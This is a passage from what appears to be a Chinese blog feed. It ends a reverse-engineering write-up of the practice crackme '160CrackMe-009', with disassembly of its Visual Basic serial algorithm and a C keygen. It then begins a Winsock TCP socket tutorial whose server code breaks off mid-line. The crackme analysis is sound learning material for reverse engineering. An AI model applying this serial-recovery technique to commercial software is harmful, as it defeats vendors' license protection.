dword ptr ds:[&lt;&amp;MSVBVM50.#<span class="hljs-number">516</span>&gt;]     ; \转为ascii<br><span class="hljs-symbol">00402176 </span>  . |<span class="hljs-number">66</span>:<span class="hljs-number">8985</span> <span class="hljs-number">4</span>CFFF&gt;mov word ptr ss:[ebp-<span class="hljs-number">0</span>xB4],ax<br><span class="hljs-number">0040217</span>D   . |<span class="hljs-number">8D55</span> CC       lea edx,dword ptr ss:[ebp-<span class="hljs-number">0</span>x34]<br><span class="hljs-symbol">00402180 </span>  . |<span class="hljs-number">8D85</span> <span class="hljs-number">44</span>FFFFFF lea eax,dword ptr ss:[ebp-<span class="hljs-number">0</span>xBC]<br><span class="hljs-symbol">00402186 </span>  . |<span class="hljs-number">52</span>            push edx                                 ; /var18 = <span class="hljs-number">0018</span>F3BC<br><span class="hljs-symbol">00402187 </span>  . |<span class="hljs-number">8D8</span>D <span class="hljs-number">74</span>FFFFFF lea ecx,dword ptr ss:[ebp-<span class="hljs-number">0</span>x8C]          ; |<br><span class="hljs-number">0040218</span>D   . |<span class="hljs-number">50</span>            push eax                                 ; |var28 = <span class="hljs-number">0018</span>F3CC<br><span class="hljs-number">0040218</span>E   . |<span class="hljs-number">51</span>            push ecx                                 ; |saveto8 = <span class="hljs-number">0018</span>F3E0<br><span class="hljs-number">0040218</span>F   . |<span class="hljs-number">899</span>D <span class="hljs-number">44</span>FFFFFF mov dword ptr ss:[ebp-<span class="hljs-number">0</span>xBC],ebx          ; |<br><span class="hljs-symbol">00402195 </span>  . |FF15 <span class="hljs-number">94414000</span> <span class="hljs-keyword">call</span> dword ptr ds:[&lt;&amp;MSVBVM50.__vbaVarAd&gt;; \相加<br><span class="hljs-number">0040219</span>B   . |<span class="hljs-number">8</span>BD0          mov edx,eax<br><span class="hljs-number">0040219</span>D   . |<span class="hljs-number">8D4</span>D CC       lea ecx,dword ptr ss:[ebp-<span class="hljs-number">0</span>x34]<br><span class="hljs-number">004021</span>A0   . |FFD6          <span class="hljs-keyword">call</span> esi                                 ;  Msvbvm50.__vbaVarMove<br><span class="hljs-number">004021</span>A2   . |<span class="hljs-number">8D4</span>D A8       lea ecx,dword ptr ss:[ebp-<span class="hljs-number">0</span>x58]<br><span class="hljs-number">004021</span>A5   . |FF15 B8414000 <span class="hljs-keyword">call</span> dword ptr ds:[&lt;&amp;MSVBVM50.__vbaFreeS&gt;;  Msvbvm50.__vbaFreeStr<br><span class="hljs-number">004021</span>AB   . |<span class="hljs-number">8D55</span> <span class="hljs-number">84</span>       lea edx,dword ptr ss:[ebp-<span class="hljs-number">0</span>x7C]<br><span class="hljs-number">004021</span>AE   . |<span class="hljs-number">8D45</span> <span class="hljs-number">94</span>       lea eax,dword ptr ss:[ebp-<span class="hljs-number">0</span>x6C]<br><span class="hljs-number">004021</span>B1   . |<span class="hljs-number">52</span>            push edx<br><span class="hljs-number">004021</span>B2   . |<span class="hljs-number">50</span>            push eax<br><span class="hljs-number">004021</span>B3   . |<span class="hljs-number">53</span>            push ebx<br><span class="hljs-number">004021</span>B4   . |FFD7          <span class="hljs-keyword">call</span> edi                                 ;  Msvbvm50.__vbaFreeVarList<br><span class="hljs-number">004021</span>B6   . |<span class="hljs-number">83</span>C4 <span class="hljs-number">0</span>C       add esp,<span class="hljs-number">0</span>xC<br><span class="hljs-number">004021</span>B9   . |<span class="hljs-number">8D8</span>D E8FEFFFF lea ecx,dword ptr ss:[ebp-<span class="hljs-number">0</span>x118]<br><span class="hljs-number">004021</span>BF   . |<span class="hljs-number">8D95</span> F8FEFFFF lea edx,dword ptr ss:[ebp-<span class="hljs-number">0</span>x108]<br><span class="hljs-number">004021</span>C5   . |<span class="hljs-number">8D45</span> DC       lea eax,dword ptr ss:[ebp-<span class="hljs-number">0</span>x24]<br><span class="hljs-number">004021</span>C8   . |<span class="hljs-number">51</span>            push ecx                                 ; /TMPend8 = <span class="hljs-number">0018</span>F3E0<br><span class="hljs-number">004021</span>C9   . |<span class="hljs-number">52</span>            push edx                                 ; |TMPstep8 = <span class="hljs-number">0018</span>F3BC<br><span class="hljs-number">004021</span>CA   . |<span class="hljs-number">50</span>            push eax                                 ; |Counter8 = <span class="hljs-number">0018</span>F3CC<br><span class="hljs-number">004021</span>CB   . |FF15 AC414000 <span class="hljs-keyword">call</span> dword ptr ds:[&lt;&amp;MSVBVM50.__vbaVarFo&gt;; \__vbaVarForNext<br><span class="hljs-number">004021D1</span>   .^|E9 <span class="hljs-number">5</span>CFFFFFF   jmp Andréna.<span class="hljs-number">00402132</span><br></code></pre></div></td></tr></table></figure><p>然后所有name相加的结果乘以0x499602D2</p><figure class="highlight x86asm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs x86asm">004021D6   &gt; \8D4D CC       <span class="hljs-keyword">lea</span> <span class="hljs-built_in">ecx</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x34</span>]<br>004021D9   .  8D95 54FFFFFF <span class="hljs-keyword">lea</span> <span class="hljs-built_in">edx</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0xAC</span>]<br>004021DF   .  <span class="hljs-number">51</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">ecx</span>                                 <span class="hljs-comment">; /var18 = 0018F404</span><br>004021E0   .  8D45 <span class="hljs-number">94</span>       <span class="hljs-keyword">lea</span> <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x6C</span>]          <span class="hljs-comment">; |</span><br>004021E3   .  <span class="hljs-number">52</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">edx</span>                                 <span class="hljs-comment">; |var28 = 0018F38C</span><br>004021E4   .  <span class="hljs-number">50</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">eax</span>                                 <span class="hljs-comment">; |SaveTo8 = 0018F3CC</span><br>004021E5   .  C785 5CFFFFFF&gt;<span class="hljs-keyword">mov</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0xA4</span>],<span class="hljs-number">0x499602D2</span>   <span class="hljs-comment">; |</span><br>004021EF   .  C785 54FFFFFF&gt;<span class="hljs-keyword">mov</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0xAC</span>],<span class="hljs-number">0x3</span>          <span class="hljs-comment">; |</span><br>004021F9   .  FF15 5C414000 <span class="hljs-keyword">call</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ds</span>:[&lt;&amp;MSVBVM50<span class="hljs-number">.</span>__vbaVarMu&gt;<span class="hljs-comment">; \__vbaVarMul</span><br></code></pre></div></td></tr></table></figure><p>这个值再转为十进制的字符串。</p><p>可以看到这个值和计算器计算出来的是一样的。</p><p><img src="/2021/08/09/160CrackMe-009/5.png"></p><p><img src="/2021/08/09/160CrackMe-009/6.png"></p><p>最后就是使用“-”替换到第四位和第九位的字符。</p><figure class="highlight basic"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs basic"><span class="hljs-symbol">00402206 </span>  .  <span class="hljs-number">8</span>B1D A0414000 mov ebx,dword ptr ds:[&lt;&amp;MSVBVM50.__vbaMi&gt;;  Msvbvm50.__vbaMidStmtVar<br><span class="hljs-number">0040220</span>C   .  <span class="hljs-number">8D4</span>D CC       lea ecx,dword ptr ss:[ebp-<span class="hljs-number">0</span>x34]<br><span class="hljs-number">0040220</span>F   .  <span class="hljs-number">51</span>            push ecx<br><span class="hljs-symbol">00402210 </span>  .  <span class="hljs-number">6</span>A <span class="hljs-number">04</span>         push <span class="hljs-number">0</span>x4<br><span class="hljs-symbol">00402212 </span>  .  <span class="hljs-number">8D95</span> <span class="hljs-number">54</span>FFFFFF lea edx,dword ptr ss:[ebp-<span class="hljs-number">0</span>xAC]<br><span class="hljs-symbol">00402218 </span>  .  <span class="hljs-number">6</span>A <span class="hljs-number">01</span>         push <span class="hljs-number">0</span>x1<br><span class="hljs-number">0040221</span>A   .  <span class="hljs-number">52</span>            push edx<br><span class="hljs-number">0040221</span>B   .  C785 <span class="hljs-number">5</span>CFFFFFF&gt;mov dword ptr ss:[ebp-<span class="hljs-number">0</span>xA4],Andréna.<span class="hljs-number">0040</span>&gt;;  -<br><span class="hljs-symbol">00402225 </span>  .  C785 <span class="hljs-number">54</span>FFFFFF&gt;mov dword ptr ss:[ebp-<span class="hljs-number">0</span>xAC],<span class="hljs-number">0</span>x8<br><span class="hljs-number">0040222</span>F   .  FFD3          <span class="hljs-keyword">call</span> ebx                                 ;  &lt;&amp;MSVBVM50.__vbaMidStmtVar&gt;<br><span class="hljs-symbol">00402231 </span>  .  <span class="hljs-number">8D45</span> CC       lea eax,dword ptr ss:[ebp-<span class="hljs-number">0</span>x34]<br><span class="hljs-symbol">00402234 </span>  .  <span class="hljs-number">8D8</span>D <span class="hljs-number">54</span>FFFFFF lea ecx,dword ptr ss:[ebp-<span class="hljs-number">0</span>xAC]<br><span class="hljs-number">0040223</span>A   .  <span class="hljs-number">50</span>            push eax<br><span class="hljs-number">0040223</span>B   .  <span class="hljs-number">6</span>A <span class="hljs-number">09</span>         push <span class="hljs-number">0</span>x9<br><span class="hljs-number">0040223</span>D   .  <span class="hljs-number">6</span>A <span class="hljs-number">01</span>         push <span class="hljs-number">0</span>x1<br><span class="hljs-number">0040223</span>F   .  <span class="hljs-number">51</span>            push ecx<br><span class="hljs-symbol">00402240 </span>  .  C785 <span class="hljs-number">5</span>CFFFFFF&gt;mov dword ptr ss:[ebp-<span class="hljs-number">0</span>xA4],Andréna.<span class="hljs-number">0040</span>&gt;;  -<br><span class="hljs-number">0040224</span>A   .  C785 <span class="hljs-number">54</span>FFFFFF&gt;mov dword ptr ss:[ebp-<span class="hljs-number">0</span>xAC],<span class="hljs-number">0</span>x8<br><span class="hljs-symbol">00402254 </span>  .  FFD3          <span class="hljs-keyword">call</span> ebx<br></code></pre></div></td></tr></table></figure><p>下面开始编写注册机</p><h2 id="注册机编写"><a href="#注册机编写" class="headerlink" title="注册机编写"></a>注册机编写</h2><p>根据以上分析的结果</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;输入name\n&quot;</span>);<br><span class="hljs-keyword">char</span> name[<span class="hljs-number">20</span>];<br><span class="hljs-built_in">gets_s</span>(name);<br><span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> key = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">int</span> len = <span class="hljs-built_in">strlen</span>(name);<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; len; i++)<br>&#123;<br>key += name[i];<br>&#125;<br>key *= <span class="hljs-number">0x499602D2</span>;<br><span class="hljs-keyword">char</span> buf[<span class="hljs-number">30</span>];<br><span class="hljs-built_in">sprintf</span>(buf, <span class="hljs-string">&quot;%lld&quot;</span>, key);<br>buf[<span class="hljs-number">3</span>] = <span class="hljs-string">&#x27;-&#x27;</span>;<br>buf[<span class="hljs-number">8</span>] = <span class="hljs-string">&#x27;-&#x27;</span>;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;你的key是：\n%s&quot;</span>, buf);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p><img src="/2021/08/09/160CrackMe-009/7.png"></p><p><img src="/2021/08/09/160CrackMe-009/8.png"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>分析起来不难，主要是VB的特性让人很折磨。</p>]]></content>
    
    
    <categories>
      
      <category>CrackMe</category>
      
    </categories>
    
    
    <tags>
      
      <tag>逆向工程</tag>
      
      <tag>CrackMe</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>传输技术-SOCKET通信</title>
    <link href="/2021/08/06/%E4%BC%A0%E8%BE%93%E6%8A%80%E6%9C%AF-SOCKET%E9%80%9A%E4%BF%A1/"/>
    <url>/2021/08/06/%E4%BC%A0%E8%BE%93%E6%8A%80%E6%9C%AF-SOCKET%E9%80%9A%E4%BF%A1/</url>
    
    <content type="html"><![CDATA[<h3 id="SOCKET通信"><a href="#SOCKET通信" class="headerlink" title="SOCKET通信"></a>SOCKET通信</h3><p>socket也被叫做“套接字”，应用程序通常通过“套接字”向网络发出请求或者接收请求。socket表示是：IP地址加上端口号，如127.0.0.1:8080。Socket编程有两种通信协议可以选择，一种是TCP，另一种是UDP。先来说一下基于TCP的Socket编程。</p><h4 id="基于TCP-Socket编程"><a href="#基于TCP-Socket编程" class="headerlink" title="基于TCP Socket编程"></a>基于TCP Socket编程</h4><p>TCP是一种基于连接的协议，在进行通信之前，必须要建立连接，其中服务端监听请求，客户端发送请求。当建立好了连接之后，就可以开始通信了。</p><h5 id="函数介绍"><a href="#函数介绍" class="headerlink" title="函数介绍"></a>函数介绍</h5><h6 id="Socket"><a href="#Socket" class="headerlink" title="Socket"></a>Socket</h6><p>根据指定的地址族、数据类型和协议来分配一个套接口的描述字及其所有资源的函数。</p><figure class="highlight arduino"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs arduino"><span class="hljs-function">SOCKET <span class="hljs-title">socket</span> <span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">        _In_ <span class="hljs-keyword">int</span> af,</span></span><br><span class="hljs-params"><span class="hljs-function">        _In_ <span class="hljs-keyword">int</span> type,</span></span><br><span class="hljs-params"><span class="hljs-function">        _In_ <span class="hljs-keyword">int</span> protocol)</span></span>;<br></code></pre></div></td></tr></table></figure><p>af：指定地址族规范。地址系列的可能值在Winsock2.h头文件中定义。当前支持AF_INET或者AF_INET6，它们是IPV4和IPV6的互联网地址族格式。</p><p>type：指定socket类型，SOCK_STREAM类型指定产生流式套接字，SOCK_DGRAM类型指定产生数据报式套接字，而SOCK_RAW类型指定产生原始套接字（只有管理员权限的用户可以创建原始套接字）。</p><p>protocol：与特定地址家族相关的协议IPPROTO_TCP、IPPROTO_UP、IPPROTO_IP，如果指定为0，那么系统会根据地址格式和套接字类别，自动选择一个合适的协议。</p><p>返回值：如果没有发生错误，则套接字返回引用新套接字的描述符，否则返回INVALID_SOCKET。</p><h6 id="bind"><a href="#bind" class="headerlink" title="bind"></a>bind</h6><p>将本地地址与套接字相关联</p><figure class="highlight nim"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nim"><span class="hljs-built_in">int</span> <span class="hljs-keyword">bind</span>(<br>  <span class="hljs-type">SOCKET</span>         s,<br>  <span class="hljs-keyword">const</span> sockaddr *<span class="hljs-keyword">addr</span>,<br>  <span class="hljs-built_in">int</span>            namelen<br>);<br></code></pre></div></td></tr></table></figure><p>s：标识未绑定套接字的描述符。</p><p>addr：指向要分配给绑定套接字的本地地址的sockaddr结构的指针。</p><p>namelen：name参数指向值的长度。</p><p>返回值：如果没有发生错误，则bind返回0，否则返回SOCKET_ERROR。</p><h6 id="htons"><a href="#htons" class="headerlink" title="htons"></a>htons</h6><p>将整型变量从主机字节顺序转变成网络字节顺序，就是整数在地址空间中的存储方式变为高位字节存放在内存的低地址处。</p><figure class="highlight abnf"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs abnf">u_short htons(<br>  u_short hostshort<br>)<span class="hljs-comment">;</span><br></code></pre></div></td></tr></table></figure><p>hostshort：指定主机字节顺序为16位。</p><p>返回值：返回TCP/IP网络字节顺序。</p><h6 id="inet-addr"><a href="#inet-addr" class="headerlink" title="inet_addr"></a>inet_addr</h6><p>将一个点分十进制的IP转换成一个长整型数。</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> <span class="hljs-title">inet_addr</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">  <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *cp</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br></code></pre></div></td></tr></table></figure><p>返回值：如果没有发生错误，返回一个无符号长整型值，其中包含给定互联网地址的适当的二进制表示形式。</p><h6 id="listen函数"><a href="#listen函数" class="headerlink" title="listen函数"></a>listen函数</h6><p>将一个套接字置于正在监听传入连接的状态。</p><figure class="highlight arduino"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs arduino"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">listen</span> <span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">    _In_ SOCKET s,</span></span><br><span class="hljs-params"><span class="hljs-function">    _In_ <span class="hljs-keyword">int</span> backlog)</span></span>;<br></code></pre></div></td></tr></table></figure><p>s：标识绑定的未连接套接字的描述符。</p><p>backlog：指定待连接队列的最大长度。如果设置为SOMAXCONN，则负责套接字的底层服务提供商将积压设置为最大合理值。如果设置为SOMAXCONN_HINT(N)（其中N是数字），则积压值为N，调整范围（200,65535）。</p><p>返回值：如没有发生错误，返回0，否则返回SOCKET_ERROR。</p><h6 id="accept"><a href="#accept" class="headerlink" title="accept"></a>accept</h6><p>允许在套接字上尝试连接</p><figure class="highlight reasonml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs reasonml">SOCKET accept (<br>      _In_ SOCKET s,<br>      <span class="hljs-constructor">_Out_writes_bytes_opt_(<span class="hljs-operator">*</span><span class="hljs-params">addrlen</span>)</span> <span class="hljs-keyword">struct</span> sockaddr FAR *addr,<br>      _Inout_opt_ <span class="hljs-built_in">int</span> FAR *addrlen);<br></code></pre></div></td></tr></table></figure><p>s：描述符，用于标识使用listen功能并处于侦听状态的套接字。连接实际上是由accept返回的套接字。</p><p>addr：指定一个可选缓冲区的指针，它接受通信层中已知连接实体的地址。addr参数的确切格式由创建sockaddr结构的套接字时建立的地址族来确定。</p><p>addrlen：指向一个整数的可选指针，其中包含由addr参数指向的结构长度。</p><p>返回值：如果没有发生错误，则accept返回一个SOCKET类型的值，该值是新套接字的描述符。此返回值是实际连接所在的套接字的句柄。否则返回INVALID_SOCKET。</p><h6 id="send"><a href="#send" class="headerlink" title="send"></a>send</h6><p>在建立连接的套接字上发送数据</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">send</span> <span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">    _In_ SOCKET s,</span></span><br><span class="hljs-params"><span class="hljs-function">    _In_reads_bytes_(len) <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> FAR * buf,</span></span><br><span class="hljs-params"><span class="hljs-function">    _In_ <span class="hljs-keyword">int</span> len,</span></span><br><span class="hljs-params"><span class="hljs-function">    _In_ <span class="hljs-keyword">int</span> flags)</span></span>;<br></code></pre></div></td></tr></table></figure><p>s：标识连接的套接字的描述符。</p><p>buf：指向要发送的数据缓冲区的指针。</p><p>len：由buf参数指向缓冲区中数据的长度。</p><p>flags：指定一组调用方式的标志，一般置为0。</p><p>返回值：如果没有发生错误，返回发送的字节数，否则返回SOCKET_ERROR。</p><h6 id="recv"><a href="#recv" class="headerlink" title="recv"></a>recv</h6><p>从连接的套接字或绑定的无连接套接字中接收数据。</p><figure class="highlight reasonml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs reasonml"><span class="hljs-built_in">int</span> recv (<br>    _In_ SOCKET s,<br>    <span class="hljs-constructor">_Out_writes_bytes_to_(<span class="hljs-params">len</span>, <span class="hljs-params">return</span>)</span> <span class="hljs-constructor">__out_data_source(NETWORK)</span> <span class="hljs-built_in">char</span> FAR<span class="hljs-operator"> * </span>buf,<br>    _In_ <span class="hljs-built_in">int</span> len,<br>    _In_ <span class="hljs-built_in">int</span> flags);<br></code></pre></div></td></tr></table></figure><p>s：标识连接的套接字的描述符。</p><p>buf：指向缓冲区的指针，用于接收传入的数据。</p><p>len：由buf参数指向缓冲区中数据的长度。</p><p>flags：指定一组调用方式的标志，一般置为0。</p><p>返回值，如果没有发生错误，则recv返回接收到的字节数，由buf参数指向的缓冲区将包含接收到的数据。如果连接已经正常关闭，则返回值为0.</p><h5 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h5><p>客户端先初始化winsock环境，然后调用Socket函数创建套接字，然后进行结构体的设置，调用bind函数绑定，再调用listen函数进行监听。当有连接请求时，调用accept函数接收连接请求。建立连接后，使用recv和send函数进行通信。</p><p>服务端先初始化winsock环境，然后调用Socket函数创建套接字，然后进行结构体的设置，然后调用connect函数发送连接请求，建立连接后，使用recv和send函数进行通信。</p><h6 id="服务端代码："><a href="#服务端代码：" class="headerlink" title="服务端代码："></a>服务端代码：</h6><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-comment">//#include &lt;WinSock2.h&gt;</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(lib, <span class="hljs-meta-string">&quot;Ws2_32.lib&quot;</span>)</span><br><span class="hljs-function">BOOL <span class="hljs-title">SocketBindAndListen</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* lpszIP, <span class="hljs-keyword">int</span> Port)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">AcceptRecvMsg</span><span class="hljs-params">()</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">SendMsg</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* pszSend)</span></span>;<br><span class="hljs-function">UINT <span class="hljs-title">RecvThreadProc</span><span class="hljs-params">(LPVOID lpVoid)</span></span>;<br>SOCKET g_ServerSocket;<br>SOCKET g_ClientSocket;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br><br><span class="hljs-keyword">if</span> (SocketBindAndListen(<span class="hljs-string">&quot;IP地址&quot;</span>, <span class="hljs-number">12345</span>) == FALSE)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;建立连接失败\n&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;连接建立成功，开始通信\n&quot;</span>);<br><span class="hljs-keyword">char</span> szSendmsg[MAX_PATH] = &#123; <span class="hljs-number">0</span> &#125;;<br><span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>&#123;<br>gets_s(szSendmsg);<br>SendMsg(szSendmsg);<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-function">BOOL <span class="hljs-title">SocketBindAndListen</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* lpszIP, <span class="hljs-keyword">int</span> Port)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-comment">//初始化winsock库</span><br>WSADATA wsaData = &#123; <span class="hljs-number">0</span> &#125;;<br>WSAStartup(MAKEWORD(<span class="hljs-number">2</span>, <span class="hljs-number">2</span>), &amp;wsaData);<br><span class="hljs-comment">//创建套接字</span><br>g_ServerSocket = socket(AF_INET, SOCK_STREAM, <span class="hljs-number">0</span>);<br><br>sockaddr_in addr;<br>addr.sin_family = AF_INET;<br>addr.sin_port = htons(Port);<br>addr.sin_addr.S_un.S_addr = inet_addr(lpszIP);<br><span class="hljs-comment">//绑定IP和端口</span><br><span class="hljs-keyword">if</span> (bind(g_ServerSocket, (sockaddr*)(&amp;addr), <span class="hljs-keyword">sizeof</span>(addr)) == SOCKET_ERROR)<br>&#123;<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><span class="hljs-comment">//设置监听</span><br><span class="hljs-keyword">if</span> (listen(g_ServerSocket, <span class="hljs-number">1</span>) == SOCKET_ERROR)<br>&#123;<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br>CreateThread(<span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, (LPTHREAD_START_ROUTINE)RecvThreadProc, <span class="hljs-literal">NULL</span>, <span 